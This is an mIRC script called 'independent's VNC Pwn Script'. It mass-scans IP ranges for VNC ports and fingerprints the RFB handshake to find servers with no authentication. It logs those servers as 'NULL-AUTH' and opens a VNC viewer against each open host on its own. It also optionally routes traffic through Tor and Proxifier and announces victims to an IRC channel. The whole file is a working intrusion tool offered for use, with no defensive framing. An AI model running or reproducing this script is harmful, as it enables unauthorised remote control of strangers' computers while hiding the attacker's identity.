on 1:START:dialog -m apwn apwn
menu * {
  independent's VNC Pwn Script: dialog -m apwn apwn
  VNC Range scanner: rvnc $?="give a number 1-255 (eg: 203)" $+ . $+ $?="give a number 0-255 (eg: 151)" $+ . $+ $?="give a number 0-255 (eg: 0)"
  Stop VNC Range scanner: .timerRANGE* off
  -
}
on *:sockopen:nmapscan*:{
  if ($sockerr) { did -a apwn 33 $sock($sockname).ip $+ : $+ $sock($sockname).port is CLOSED $crlf | hinc -m apwn portc | did -a apwn 37 Closed Ports: $hget(apwn,portc) | return }
  hinc -m apwn porta
  did -a apwn 33 $sock($sockname).ip $+ : $+ $sock($sockname).port is OPEN $crlf
  if ($did(apwn,29).state) && ($server) msg $chr(35) $+ $did(apwn,30) 3,1 $sock($sockname).ip $+ : $+ $sock($sockname).port is OPEN
  if (59* iswm $sock($sockname).port) { run $scriptdirvnc.exe $sock($sockname).ip $+ : $+ $sock($sockname).port }
  did -a apwn 36 Open Ports: $hget(apwn,porta)
  sockclose $sockname
}
dialog apwn {
  title "independent's VNC Pwn Script"
  size -1 -1 707 654
  option pixels
  box "IP List", 1, 10 10 195 641
  edit "Add IPs Here", 2, 18 32 170 596, multi vsbar limit 999999
  button "PWN THAT SHIT!", 27, 26 624 151 25
  box "Debug", 28, 215 69 339 574
  check "Chan Output", 29, 225 19 85 17
  edit "autopwn", 30, 228 38 81 20, center
  edit "Script Output", 33, 231 95 310 528, multi vsbar limit 9999
  box "STATS", 34, 557 176 148 123
  text "Open Threads:", 35, 565 196 132 17
  text "Open ports:", 36, 566 221 130 17
  text "Closed ports:", 37, 565 250 132 17
  box "Tor Control", 18, 567 317 110 79, hide
  check "Enable TOR", 22, 573 350 100 20
  button "Close all VNC Windows", 45, 572 269 123 25
}






on 1:dialog:apwn:sclick:27: {
  hdel apwn inc
  did -r apwn 33
  hadd -m apwn max $did(apwn,2,0).lines
  .timerSCLICK -om $hget(apwn,max) 0 autopwn

}
on 1:dialog:apwn:sclick:22:{
  if (!%torenable) {
    run $shortfn($scriptdirTor\tor.exe)
    run $shortfn($scriptdirProxifier\Proxifier.exe)
    set %torenable ON
  }
  else {  unset %torenable | run taskkill /im tor.exe /f | run taskkill /im Proxifier.exe /f }
}
on 1:dialog:apwn:sclick:45:{
  run taskkill /im vnc.exe /f
}
on 1:dialog:apwn:init:0:{
  hmake apwn
  hload apwn apwn.dat
}
on 1:EXIT:hsave apwn apwn.dat
alias autopwn {
  hinc -m apwn inc
  hadd -m apwn current $getip($gettok($did(apwn,2,$hget(apwn,inc)),1,58) $+ : $+ $gettok($did(apwn,2,$hget(apwn,inc)),2,58))
  sockopen nmapscan $+ $gettok($hget(apwn,current),1,32) $+ $r(0,999999) $hget(apwn,current)
  did -a apwn 35 Open Threads: $sock(nmapscan*,0).name  
}
addapwn {
  did -a apwn 25 $1- 
}
alias vnc { run $shortfn($scriptdirvnc.exe) $cb }
alias getip {
  %var = /\b((?:(?:[a-z]+)\.)+(?:[a-z]+)[: ]\d{2,5})\b|\b((?:(?:(25[0-5]|2[0-4]\d|[01]?\d?\d))\.){3}(?3)[: ]\d{2,5})\b/i
  if $regex(ip,$remove($1-,$chr(9)),%var) {
    return $replace($regml(ip,1),:,$chr(32))
  }
}

on *:sockread:vncscan*:{
  :nextread
  sockread %vnc
  if (*82*70*66*32*48*48*51*46*48*48*56*10* iswm %vnc) {
    bset &vnc1 1 1
    sockwrite -n $sockname &vnc1 
  }
  elseif (*0*0*0*0* iswm %vnc) && (%vncip != $sock($sockname).ip)  { checkvnc $sockname | set %vncip $sock($sockname).ip }

  elseif ($sockbr) goto nextread

}

alias checkvnc {
  .write system.log   $+ $r(0,99) $+ , $+ $r(0,99) NULL-AUTH $sock($1).ip $+ : $+ $sock($1).port
  window @vncscan
  echo @vncscan   $+ $r(0,99) $+ , $+ $r(0,99) NULL-AUTH $sock($1).ip $+ : $+ $sock($1).port
  .timerPLAYQUEUE 1 5 playqueue
  if ($calc($sock($1).port +1) == 6000) return
  .timer $+ $1 $+ $calc($sock($1).port +1) 1 0 sockopen $1 $+ $r(0,9999) $sock($1).ip $calc($sock($1).port +1) 
}

on *:sockclose:vncscan*:return
alias rvnc {
  if (%range) { unset %range* | unset %vnc* }
  if (!%interval) set %interval 0
  if (!%vncport) set %vncport 5900
  if ($2) set %vncport $2
  set %range $1
  .timerRANGEthread1 -om 0 %interval nextvnc 
  window -a @vncscan
  .echo @vncscan VNC Scan starting at range $1 port: %vncport
}

alias nextvnc {
  inc %rangex
  if (256 <= $gettok(%range,2,46)) { unset %range | echo @vncscan   $+ $r(0,99) $+ , $+ $r(0,99)* Scan halted, waiting for new command... }
  if (256 <= %rangex) { unset %rangex | %range = $+($gettok(%range,1-2,46),.,$calc($gettok(%range,3,46) + 1),.,%rangex) }
  sockopen vncscan $+ $r(0,999999999999999999) $+(%range,.,%rangex) %vncport
}


